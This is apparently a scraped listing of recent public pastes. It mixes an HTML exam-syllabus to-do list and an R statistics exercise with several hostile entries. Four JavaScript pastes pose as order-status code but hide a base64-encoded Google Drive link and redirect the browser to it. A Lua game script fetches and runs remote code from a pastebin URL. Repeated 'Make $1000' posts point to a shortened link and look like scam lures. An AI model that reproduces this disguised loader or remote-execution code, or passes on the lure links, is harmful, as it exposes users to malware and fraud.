id,title,username,language,date,content
Xr0krQAh,Make $1000 15-MINUTES (BEGINNER) 7J,BrianBSuperHero,JavaScript,Monday 21st of April 2025 12:59:11 PM CDT," 
Pdf https://tinyurl.com/privguidee


wacHpFYjgx
"
RsjpSzrm,Market.js,WantingTrae,JavaScript,Monday 21st of April 2025 12:53:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41480/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JZkTWWsU,BGSI Peteware,poupeuu_v2,Lua,Monday 21st of April 2025 12:48:49 PM CDT,"--[[

 _______  _______ _________ _______           _______  _______  _______ 
(  ____ )(  ____ \\__   __/(  ____ \|\     /|(  ___  )(  ____ )(  ____ \
| (    )|| (    \/   ) (   | (    \/| )   ( || (   ) || (    )|| (    \/
| (____)|| (__       | |   | (__    | | _ | || (___) || (____)|| (__    
|  _____)|  __)      | |   |  __)   | |( )| ||  ___  ||     __)|  __)   
| (      | (         | |   | (      | || || || (   ) || (\ (   | (      
| )      | (____/\   | |   | (____/\| () () || )   ( || ) \ \__| (____/\
|/       (_______/   )_(   (_______/(_______)|/     \||/   \__/(_______/
                                                                        
]]
loadstring(game:HttpGet(""https://pastebin.com/raw/J6z0LsTs"",true))()

--Discord server: https://discord.gg/zNFdGtvdgR"
j8iJLFZB,EARN $900 INSTANTLY 2025⭐ 1R,BrianBSuperHero,JavaScript,Monday 21st of April 2025 12:45:45 PM CDT," 
Pdf https://tinyurl.com/privguidee


BcyAzAAYVO
"
RveJASEN,BSc (Hons) Computer Science Entrance Syllabus to do list,Zain42,HTML,Monday 21st of April 2025 12:43:54 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1"">
  <title>Enhanced To-Do Lists & Countdown</title>
  <link rel=""preconnect"" href=""https://fonts.googleapis.com"">
  <link rel=""preconnect"" href=""https://fonts.gstatic.com"" crossorigin>
  <link href=""https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"" rel=""stylesheet"">
  <style>
    :root {
      --bg-color-1: #1a1a1d;
      --bg-color-2: #212124;
      --bg-color-3: #1f1f22; /* Added for gradient animation */
      --primary-surface: #2c2c34;
      --secondary-surface: #3a3a4a; /* Slightly adjusted hover */
      --primary-text: #f0f0f5;
      --secondary-text: #a0a0b0;
      --accent-color: #6c63ff;
      --accent-color-darker: #5850e0; /* For hover states */
      --completed-color: #757575;
      --border-color: #3a3a4a;
      --shadow-color: rgba(0, 0, 0, 0.3); /* Slightly darker shadow */
      --shadow-color-light: rgba(0, 0, 0, 0.15);
      --glow-color: rgba(108, 99, 255, 0.3); /* Accent color glow */
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      color: var(--primary-text);
      font-family: 'Inter', sans-serif;
      padding: 30px;
      line-height: 1.6;
      background: linear-gradient(135deg, var(--bg-color-1), var(--bg-color-2), var(--bg-color-3), var(--bg-color-2));
      background-size: 400% 400%;
      animation: gradientBG 18s ease infinite;
      overflow-x: hidden;
    }

    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }


    #countdown {
      position: fixed;
      top: 15px;
      right: 20px;
      background-color: rgba(44, 44, 52, 0.7);
      backdrop-filter: blur(8px);
      padding: 10px 18px;
      border-radius: 25px;
      font-size: 0.9em;
      font-weight: 600;
      color: var(--primary-text);
      z-index: 100;
      box-shadow: 0 3px 8px var(--shadow-color);
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: background-color 0.3s ease;
    }
     #countdown span {
        display: inline-block;
        min-width: 8px;
        text-align: center;
        transition: transform 0.3s ease-out, opacity 0.3s ease-out;
     }
     #countdown span.digit-changing {
         transform: translateY(-5px);
         opacity: 0;
     }


    .tabs-container {
        display: flex;
        justify-content: center;
        margin-bottom: 30px;
        border-bottom: 1px solid var(--border-color);
        position: relative;
    }

    .tabs {
      display: flex;
      position: relative;
    }

    .tab {
      padding: 14px 30px;
      cursor: pointer;
      background-color: transparent;
      border: none;
      color: var(--secondary-text);
      margin-right: 8px;
      transition: color 0.3s ease, background-color 0.3s ease, box-shadow 0.3s ease;
      font-weight: 600;
      position: relative;
      overflow: hidden;
      border-radius: 6px 6px 0 0;
    }

     .tab::after { /* Animated underline */
         content: '';
         position: absolute;
         bottom: 0;
         left: 50%;
         width: 0;
         height: 3px;
         background-color: var(--accent-color);
         transition: width 0.4s ease, left 0.4s ease;
     }


    .tab:hover {
      color: var(--primary-text);
      background-color: rgba(255, 255, 255, 0.05);
      box-shadow: 0 0 15px -2px var(--glow-color);
    }

    .tab.active {
      color: var(--accent-color);
      font-weight: 700;
    }
    .tab.active::after {
        width: 80%;
        left: 10%;
    }


    .tab-content {
      display: none;
      max-width: 750px;
      margin: 0 auto;
      /* Removed animation property here, will be controlled by JS */
      opacity: 1; /* Start visible, JS will fade in */
      padding-top: 20px;
      position: relative;
    }

     @keyframes contentFadeIn { /* Keep this for tab switching maybe */
      from { opacity: 0; transform: translateY(15px); }
      to { opacity: 1; transform: translateY(0); }
    }


    .tab-content.active {
      display: block;
      /* animation: contentFadeIn 0.6s ease forwards; Applied manually if needed */
    }

    /* --- Progress Bar Styles --- */
    .progress-bar-container {
        width: 100%;
        height: 8px; /* Thinner bar */
        background-color: var(--secondary-surface);
        border-radius: 4px;
        margin-bottom: 25px;
        overflow: hidden;
        box-shadow: inset 0 1px 3px rgba(0,0,0,0.3);
    }

    .progress-bar-fill {
        height: 100%;
        width: 0%;
        background: linear-gradient(90deg, var(--accent-color-darker), var(--accent-color));
        border-radius: 4px;
        transition: width 0.7s cubic-bezier(0.65, 0, 0.35, 1); /* Smooth animation */
        box-shadow: 0 0 8px 0px var(--glow-color);
    }

    h1 {
      margin-bottom: 20px;
      color: var(--primary-text);
      font-weight: 700;
      text-align: center;
      letter-spacing: 0.5px;
    }

    ul {
      list-style: none;
      width: 100%;
      padding: 0;
    }

    li {
      display: flex;
      align-items: center;
      padding: 18px 22px;
      margin-bottom: 12px;
      background-color: var(--primary-surface);
      border-radius: 10px;
      transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease, border-left-color 0.3s ease, opacity 0.4s ease;
      border-left: 5px solid transparent;
      box-shadow: 0 2px 5px var(--shadow-color-light);
      /* Animation properties removed - will be applied via JS for non-completed */
      position: relative;
       opacity: 1; /* Default to visible, JS will handle initial state for animation */
       transform: translateX(0); /* Default state */
    }

    /* Stagger animation delays applied via JS */


    @keyframes listItemSlideIn {
        from {
            opacity: 0;
            transform: translateX(-15px);
        }
        to {
            opacity: 1;
            transform: translateX(0);
        }
    }


    li:hover {
      background-color: var(--secondary-surface);
      transform: translateY(-3px) scale(1.01); /* Adjust hover transform */
      box-shadow: 0 5px 12px var(--shadow-color), 0 0 18px -3px var(--glow-color);
      border-left-color: var(--accent-color);
    }

     /* Ensure hover transform is slightly adjusted for completed items */
     li.completed:hover {
         transform: translateY(-1px) scale(0.95); /* Less pronounced lift */
         box-shadow: 0 2px 5px var(--shadow-color-light);
         background-color: var(--secondary-surface);
         opacity: 0.65;
         border-left-color: var(--completed-color); /* Keep border consistent */
     }


    li label {
      margin-left: 18px;
      flex-grow: 1;
      cursor: pointer;
      transition: color 0.3s ease, text-decoration-color 0.4s ease;
      word-break: break-word;
      color: var(--primary-text);
      position: relative;
      text-decoration: none;
      text-decoration-color: transparent;
    }

     /* Strikethrough animation */
     li label::before {
         content: '';
         position: absolute;
         top: 50%;
         left: 0;
         width: 0;
         height: 2px;
         background-color: var(--completed-color);
         /* transition property moved to JS/CSS variable */
         transform: translateY(-1px);
     }


    li.completed {
       background-color: var(--primary-surface);
       opacity: 0.6;
       border-left-color: var(--completed-color);
       transform: scale(0.95);
       box-shadow: 0 1px 3px var(--shadow-color-light);
       /* No animation needed here */
    }


    li.completed label {
      color: var(--completed-color);
    }
     li.completed label::before {
         width: 100%; /* Show strikethrough */
     }


    input[type=""checkbox""] {
      appearance: none;
      width: 22px;
      height: 22px;
      border: 2px solid var(--secondary-text);
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.25s ease-in-out;
      flex-shrink: 0;
      position: relative;
      background-color: transparent;
    }

    input[type=""checkbox""]:hover {
        border-color: var(--accent-color);
        transform: scale(1.1);
        box-shadow: 0 0 8px -2px var(--glow-color);
    }


    input[type=""checkbox""]:checked {
      background-color: var(--accent-color);
      border-color: var(--accent-color);
      transform: scale(1.05);
       animation: checkBounce 0.3s ease;
    }

     @keyframes checkBounce {
         0% { transform: scale(1.05); }
         50% { transform: scale(1.15); }
         100% { transform: scale(1.05); }
     }


    /* Custom checkmark animation */
     input[type=""checkbox""]::after {
        content: '✔';
        color: var(--bg-color-1);
        font-size: 16px;
        font-weight: bold;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) scale(0);
        transition: transform 0.2s 0.1s ease-out;
        line-height: 1;
     }
      input[type=""checkbox""]:checked::after {
         transform: translate(-50%, -50%) scale(1);
      }


    li.completed input[type=""checkbox""] {
        background-color: var(--completed-color);
        border-color: var(--completed-color);
        opacity: 0.8;
    }
     li.completed input[type=""checkbox""]:checked::after {
         color: var(--primary-surface);
     }

  </style>
</head>
<body>

  <div id=""countdown""></div>

  <div class=""tabs-container"">
      <div class=""tabs"">
        <div class=""tab active"" data-target=""math"">Math Topics</div>
        <div class=""tab"" data-target=""computer"">Computer Awareness</div>
        <div class=""tab"" data-target=""reasoning"">Reasoning</div>
        <div class=""tab"" data-target=""english"">General English</div>
      </div>
  </div>


  <div id=""math"" class=""tab-content active"">
    <div class=""progress-bar-container"">
        <div class=""progress-bar-fill""></div>
    </div>
     <h1>Math Topics To-Do List</h1>
    <ul>
      <li><input type=""checkbox"" id=""topic1""><label for=""topic1"">Sets, Relations, and Functions</label></li>
      <li><input type=""checkbox"" id=""topic2""><label for=""topic2"">Trigonometric Functions</label></li>
      <li><input type=""checkbox"" id=""topic3""><label for=""topic3"">Complex Numbers and Quadratic Equations</label></li>
      <li><input type=""checkbox"" id=""topic4""><label for=""topic4"">Linear Inequalities</label></li>
      <li><input type=""checkbox"" id=""topic5""><label for=""topic5"">Sequences and Series</label></li>
      <li><input type=""checkbox"" id=""topic6""><label for=""topic6"">Permutations and Combinations</label></li>
      <li><input type=""checkbox"" id=""topic7""><label for=""topic7"">Binomial Theorem</label></li>
      <li><input type=""checkbox"" id=""topic8""><label for=""topic8"">Matrices</label></li>
      <li><input type=""checkbox"" id=""topic9""><label for=""topic9"">Determinants</label></li>
      <li><input type=""checkbox"" id=""topic10""><label for=""topic10"">Inverse Trigonometric Functions</label></li>
      <li><input type=""checkbox"" id=""topic11""><label for=""topic11"">Limits and Derivatives</label></li>
      <li><input type=""checkbox"" id=""topic12""><label for=""topic12"">Continuity and Differentiability</label></li>
      <li><input type=""checkbox"" id=""topic13""><label for=""topic13"">Application of Derivatives</label></li>
      <li><input type=""checkbox"" id=""topic14""><label for=""topic14"">Integrals (Indefinite + Definite)</label></li>
      <li><input type=""checkbox"" id=""topic15""><label for=""topic15"">Application of Integrals</label></li>
      <li><input type=""checkbox"" id=""topic16""><label for=""topic16"">Differential Equations</label></li>
      <li><input type=""checkbox"" id=""topic17""><label for=""topic17"">Straight Lines</label></li>
      <li><input type=""checkbox"" id=""topic18""><label for=""topic18"">Conic Sections</label></li>
      <li><input type=""checkbox"" id=""topic19""><label for=""topic19"">Introduction to 3D Geometry</label></li>
      <li><input type=""checkbox"" id=""topic20""><label for=""topic20"">Vector Algebra</label></li>
      <li><input type=""checkbox"" id=""topic21""><label for=""topic21"">Three Dimensional Geometry</label></li>
      <li><input type=""checkbox"" id=""topic22""><label for=""topic22"">Statistics</label></li>
      <li><input type=""checkbox"" id=""topic23""><label for=""topic23"">Probability</label></li>
      <li><input type=""checkbox"" id=""topic24""><label for=""topic24"">Linear Programming</label></li>
    </ul>
  </div>

  <div id=""computer"" class=""tab-content"">
     <div class=""progress-bar-container"">
         <div class=""progress-bar-fill""></div>
     </div>
     <h1>Computer Awareness To-Do List</h1>
     <ul>
       <li><input type=""checkbox"" id=""ca1""><label for=""ca1"">Computer Organization</label></li>
       <li><input type=""checkbox"" id=""ca2""><label for=""ca2"">Components</label></li>
       <li><input type=""checkbox"" id=""ca3""><label for=""ca3"">I/O Devices</label></li>
       <li><input type=""checkbox"" id=""ca4""><label for=""ca4"">Storage Devices</label></li>
       <li><input type=""checkbox"" id=""ca5""><label for=""ca5"">Types of Computer Systems</label></li>
       <li><input type=""checkbox"" id=""ca6""><label for=""ca6"">Types of Software</label></li>
       <li><input type=""checkbox"" id=""ca7""><label for=""ca7"">Programming Languages</label></li>
       <li><input type=""checkbox"" id=""ca8""><label for=""ca8"">Number Systems</label></li>
       <li><input type=""checkbox"" id=""ca9""><label for=""ca9"">Internet</label></li>
       <li><input type=""checkbox"" id=""ca10""><label for=""ca10"">Extranet</label></li>
       <li><input type=""checkbox"" id=""ca11""><label for=""ca11"">Intranet</label></li>
       <li><input type=""checkbox"" id=""ca12""><label for=""ca12"">Popular Computer Brands</label></li>
       <li><input type=""checkbox"" id=""ca13""><label for=""ca13"">Popular Computer Software Companies</label></li>
       <li><input type=""checkbox"" id=""ca14""><label for=""ca14"">Recent Developments</label></li>
       <li><input type=""checkbox"" id=""ca15""><label for=""ca15"">Common Computer Terminology</label></li>
       <li><input type=""checkbox"" id=""ca16""><label for=""ca16"">Windows</label></li>
       <li><input type=""checkbox"" id=""ca17""><label for=""ca17"">Current Trends/News</label></li>
      </ul>
  </div>

  <div id=""reasoning"" class=""tab-content"">
       <div class=""progress-bar-container"">
           <div class=""progress-bar-fill""></div>
       </div>
       <h1>Reasoning To-Do List</h1>
     <ul>
       <li><input type=""checkbox"" id=""r1""><label for=""r1"">Logical Reasoning</label></li>
       <li><input type=""checkbox"" id=""r2""><label for=""r2"">Symbolic Reasoning</label></li>
       <li><input type=""checkbox"" id=""r3""><label for=""r3"">Verbal &amp; Mathematical Reasoning</label></li>
       <li><input type=""checkbox"" id=""r4""><label for=""r4"">Finding Odd-Man Out</label></li>
       <li><input type=""checkbox"" id=""r5""><label for=""r5"">Matching</label></li>
       <li><input type=""checkbox"" id=""r6""><label for=""r6"">Differences</label></li>
       <li><input type=""checkbox"" id=""r7""><label for=""r7"">Similarities</label></li>
       <li><input type=""checkbox"" id=""r8""><label for=""r8"">Prediction</label></li>
       <li><input type=""checkbox"" id=""r9""><label for=""r9"">Interpolation and Extrapolation in Number Series</label></li>
       <li><input type=""checkbox"" id=""r10""><label for=""r10"">Number Series</label></li>
       <li><input type=""checkbox"" id=""r11""><label for=""r11"">Alphabet Series</label></li>
       <li><input type=""checkbox"" id=""r12""><label for=""r12"">Test of Direction Sense</label></li>
       <li><input type=""checkbox"" id=""r13""><label for=""r13"">Coding-Decoding</label></li>
       <li><input type=""checkbox"" id=""r14""><label for=""r14"">Number Ranking</label></li>
       <li><input type=""checkbox"" id=""r15""><label for=""r15"">Arithmetical Reasoning</label></li>
       <li><input type=""checkbox"" id=""r16""><label for=""r16"">Blood Relations</label></li>
       <li><input type=""checkbox"" id=""r17""><label for=""r17"">Analogy</label></li>
       <li><input type=""checkbox"" id=""r18""><label for=""r18"">Decision Making</label></li>
       <li><input type=""checkbox"" id=""r19""><label for=""r19"">Non-verbal Series</label></li>
       <li><input type=""checkbox"" id=""r20""><label for=""r20"">Mirror Images</label></li>
       <li><input type=""checkbox"" id=""r21""><label for=""r21"">Grouping Identical Figures</label></li>
       <li><input type=""checkbox"" id=""r22""><label for=""r22"">Common Reasoning Fallacies</label></li>
     </ul>
  </div>

  <div id=""english"" class=""tab-content"">
       <div class=""progress-bar-container"">
           <div class=""progress-bar-fill""></div>
       </div>
       <h1>General English To-Do List</h1>
     <ul>
       <li><input type=""checkbox"" id=""ge1""><label for=""ge1"">Vocabulary</label></li>
       <li><input type=""checkbox"" id=""ge2""><label for=""ge2"">Punctuation</label></li>
       <li><input type=""checkbox"" id=""ge3""><label for=""ge3"">Syntax</label></li>
       <li><input type=""checkbox"" id=""ge4""><label for=""ge4"">Verb Forms</label></li>
       <li><input type=""checkbox"" id=""ge5""><label for=""ge5"">Spelling</label></li>
       <li><input type=""checkbox"" id=""ge6""><label for=""ge6"">Synonyms</label></li>
       <li><input type=""checkbox"" id=""ge7""><label for=""ge7"">Antonyms</label></li>
       <li><input type=""checkbox"" id=""ge8""><label for=""ge8"">Tense</label></li>
       <li><input type=""checkbox"" id=""ge9""><label for=""ge9"">Use of Preposition</label></li>
       <li><input type=""checkbox"" id=""ge10""><label for=""ge10"">Conjunctions</label></li>
       <li><input type=""checkbox"" id=""ge11""><label for=""ge11"">Active and Passive Voice</label></li>
       <li><input type=""checkbox"" id=""ge12""><label for=""ge12"">Simple, Complex, and Compound Sentences</label></li>
       <li><input type=""checkbox"" id=""ge13""><label for=""ge13"">Degree of Comparison</label></li>
       <li><input type=""checkbox"" id=""ge14""><label for=""ge14"">Direct and Indirect Speech</label></li>
      </ul>
  </div>

  <script>
    // --- Tab switching ---
    const tabs = document.querySelectorAll('.tab');
    const tabContents = document.querySelectorAll('.tab-content');

    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        // Remove active classes from tabs and content
        tabs.forEach(t => t.classList.remove('active'));
        tabContents.forEach(content => {
            content.classList.remove('active');
            // Optional: Add fade-out effect for switching tabs
            // content.style.animation = 'none'; // Reset animation if needed
        });


        // Add active classes to the clicked tab and corresponding content
        tab.classList.add('active');
        const targetId = tab.getAttribute('data-target');
        const activeContent = document.getElementById(targetId);
        activeContent.classList.add('active');
        // Optional: Trigger fade-in animation for the new tab content
        activeContent.style.animation = 'contentFadeIn 0.6s ease forwards';


        // Reset and potentially re-trigger animations for list items in the NEWLY active tab
         const listItems = activeContent.querySelectorAll('li');
         listItems.forEach((item, index) => {
            item.style.animation = 'none'; // Remove any existing animation instance first

            // If item is completed, ensure it's styled correctly without animation
            if(item.classList.contains('completed')){
                item.style.opacity = '0.6'; // Keep consistent completed opacity
                item.style.transform = 'scale(0.95)'; // Keep consistent completed transform
            } else {
                // Apply animation for non-completed items
                item.style.opacity = '0'; // Reset opacity for animation start
                item.style.transform = 'translateX(-15px)'; // Reset transform for animation start
                item.offsetHeight; // Trigger reflow to apply reset styles before animation
                item.style.animation = `listItemSlideIn 0.5s ease forwards ${index * 0.05}s`;
            }
         });
         updateProgressBar(activeContent); // Update progress bar for the switched tab
      });
    });

    // --- Progress Bar Update Function ---
    function updateProgressBar(listContainer) {
        const progressBarFill = listContainer.querySelector('.progress-bar-fill');
        const checkboxes = listContainer.querySelectorAll('input[type=""checkbox""]');
        const totalItems = checkboxes.length;
        if (!progressBarFill) return; // Exit if no progress bar found
        if (totalItems === 0) {
            progressBarFill.style.width = '0%';
            return;
        }
        const completedItems = listContainer.querySelectorAll('li.completed').length; // Count based on class now
        const percentage = (completedItems / totalItems) * 100;
        requestAnimationFrame(() => {
            progressBarFill.style.width = `${percentage}%`;
        });
    }


    // --- Toggle completed class & Update Progress ---
    document.querySelectorAll('input[type=""checkbox""]').forEach(checkbox => {
      checkbox.addEventListener('change', function() {
        const listItem = this.closest('li');
        const listContainer = this.closest('.tab-content');
        if (!listItem || !listContainer) return; // Safety check

        requestAnimationFrame(() => {
            listItem.classList.toggle('completed', this.checked);

             // Reset animation state and styles when toggling
             listItem.style.animation = 'none'; // Stop any ongoing animation

             if(this.checked){
                 // Apply completed styles immediately
                 listItem.style.opacity = '0.6';
                 listItem.style.transform = 'scale(0.95)';
             } else {
                  // Apply non-completed styles immediately
                 listItem.style.opacity = '1';
                 listItem.style.transform = 'translateX(0) scale(1)'; // Reset transform fully
             }

            // Ensure the label's pseudo-element transition is enabled for clicks
            const label = listItem.querySelector('label');
             if(label && label.style) {
                 label.style.removeProperty('--pseudo-transition-duration'); // Use default transition
             }
            updateProgressBar(listContainer);
        });
      });
    });

    // --- Countdown logic ---
    const countdownElement = document.getElementById('countdown');
    const targetDate = new Date('2025-05-05T00:00:00');
    let lastTimeValues = {};
    let interval; // Define interval variable in wider scope

    function updateCountdown() {
      const now = new Date();
      const diff = targetDate - now;

      if (diff <= 0) {
        countdownElement.innerHTML = ""<span>Time's up!</span>"";
        if(interval) clearInterval(interval);
        return;
      }

      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
      const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
      const minutes = Math.floor((diff / (1000 * 60)) % 60);
      const seconds = Math.floor((diff / 1000) % 60);

      const currentTimeValues = { days, hours, minutes, seconds };
      let html = '<span>Countdown: </span>';
      const addDigit = (value, unit, lastValue) => {
          const paddedValue = String(value).padStart(2, '0');
          let digitHtml = '';
          for (let i = 0; i < paddedValue.length; i++) {
              const digit = paddedValue[i];
              const lastDigit = lastValue !== undefined ? String(lastValue).padStart(2, '0')[i] : null;
              const hasChanged = lastDigit !== digit;
              digitHtml += `<span class=""${hasChanged ? 'digit-changing' : ''}"" style=""transition-delay: ${i * 0.05}s"">${digit}</span>`;
          }
           return `${digitHtml}<span>${unit}</span> `;
      };

      html += addDigit(days, 'd', lastTimeValues.days);
      html += addDigit(hours, 'h', lastTimeValues.hours);
      html += addDigit(minutes, 'm', lastTimeValues.minutes);
      html += addDigit(seconds, 's', lastTimeValues.seconds);

      // Update only if HTML is different to minimize reflows
      if (countdownElement.innerHTML !== html) {
         countdownElement.innerHTML = html;
      }


      const changingDigits = countdownElement.querySelectorAll('.digit-changing');
        requestAnimationFrame(() => {
            changingDigits.forEach(span => {
                setTimeout(() => {
                    span.classList.remove('digit-changing');
                    span.style.transform = 'translateY(0)';
                    span.style.opacity = '1';
                }, 10); // Small delay to allow rendering changes
            });
        });

      lastTimeValues = currentTimeValues;
    }

    updateCountdown(); // Initial call
    interval = setInterval(updateCountdown, 1000); // Assign to interval variable

     // --- Initial setup on DOMContentLoaded ---
     document.addEventListener('DOMContentLoaded', () => {
        // Inject CSS rule for the transition variable
        try {
            const styleSheet = document.styleSheets[0];
            if (styleSheet) {
                // Check if rule already exists (simple check)
                let ruleExists = false;
                for (let i = 0; i < styleSheet.cssRules.length; i++) {
                    if (styleSheet.cssRules[i].selectorText === 'li label::before') {
                        ruleExists = true;
                        break;
                    }
                }
                if (!ruleExists) {
                    styleSheet.insertRule(`
                        li label::before {
                            transition: width var(--pseudo-transition-duration, 0.4s) ease-out; /* Use variable */
                        }
                    `, styleSheet.cssRules.length);
                }
            }
        } catch (e) {
            console.warn(""Could not insert CSS rule for pseudo-element transition:"", e);
        }


        // --- FIX V2 REFINED START ---
        // Iterate through ALL list items on the page on load
        document.querySelectorAll('li').forEach(listItem => {
             const checkbox = listItem.querySelector('input[type=""checkbox""]');
             if (checkbox && checkbox.checked) {
                 // It's a completed item
                 listItem.classList.add('completed');
                 // Ensure completed styles are applied directly, overriding defaults
                 listItem.style.opacity = '0.6';
                 listItem.style.transform = 'scale(0.95)';
                 listItem.style.animation = 'none'; // IMPORTANT: No animation

                 const label = listItem.querySelector('label');
                 if (label && label.style) {
                      label.style.setProperty('--pseudo-transition-duration', '0s'); // Disable strikethrough transition initially
                 }
             } else {
                 // It's a non-completed item, prepare for animation
                  listItem.style.opacity = '0'; // Start hidden
                  listItem.style.transform = 'translateX(-15px)'; // Start off-screen
                  listItem.style.animation = 'none'; // Ensure no animation is running yet
             }
        });
        // --- FIX V2 REFINED END ---


        const initialActiveContent = document.querySelector('.tab-content.active');
        if (initialActiveContent) {
            // Find only non-completed items in the active tab to animate
            const listItemsToAnimate = initialActiveContent.querySelectorAll('li:not(.completed)');

             requestAnimationFrame(() => { // Wait for next frame to start animation
                 listItemsToAnimate.forEach((item, index) => {
                     item.style.animationDelay = `${index * 0.05}s`; // Apply stagger delay
                     item.style.animation = `listItemSlideIn 0.5s ease forwards ${index * 0.05}s`; // Apply animation with delay
                 });
             });
        }

        // Update progress bars for ALL tabs after setting initial completed states
        tabContents.forEach(content => {
            updateProgressBar(content);
        });

     });

  </script>
</body>
</html>"
f72VrJkf,Untitled,WantingTrae,JavaScript,Monday 21st of April 2025 12:37:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42804/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FJnrWrfP,Make $1000 15-MINUTES  (BEGINNER) SW,BrianBSuperHero,JavaScript,Monday 21st of April 2025 12:32:20 PM CDT," 
Pdf https://tinyurl.com/privguidee


VbYfAIzIAi
"
TCm4CgMs,Products.js,WantingTrae,JavaScript,Monday 21st of April 2025 12:22:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98636/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ay2v9Q9m,EARN $900 INSTANTLY 2025 JQ,BrianBSuperHero,JavaScript,Monday 21st of April 2025 12:18:52 PM CDT," 
Pdf https://tinyurl.com/privguidee


Cv9tf6brUn
"
nAWnCJmn,EXP11_StatisticsinR,vvccs,R,Monday 21st of April 2025 12:15:53 PM CDT,"# Load dataset
Data_Cars <- mtcars

# 1. Structure of the dataset
dim(Data_Cars)                 # Dimensions of the dataset (rows, columns)
names(Data_Cars)              # Column names (features)
rownames(Data_Cars)           # Row names (car names)
Data_Cars$cyl                 # Accessing 'cyl' column
sort(Data_Cars$cyl)           # Sorted values of 'cyl'

# 2. Central Tendency
mean(Data_Cars$wt)            # Mean of weight
median(Data_Cars$wt)          # Median of weight
names(sort(-table(Data_Cars$wt)))[1]  # Mode of weight (most frequent)

# 3. Dispersion / Spread
quantile(Data_Cars$wt)        # Percentiles of weight
quantile(Data_Cars$wt, c(0.75))  # 75th percentile (Q3)

# 4. Extremes
max(Data_Cars$hp)             # Maximum horsepower
min(Data_Cars$hp)             # Minimum horsepower
which.max(Data_Cars$hp)       # Index of car with max hp
which.min(Data_Cars$hp)       # Index of car with min hp
rownames(Data_Cars)[which.max(Data_Cars$hp)]  # Name of car with max hp
rownames(Data_Cars)[which.min(Data_Cars$hp)]  # Name of car with min hp

# (Optional) Summary for cross-checking (not to be used for stats)
summary(Data_Cars)
"
vfkrv0e1,Order.js,WantingTrae,JavaScript,Monday 21st of April 2025 12:06:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66852/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
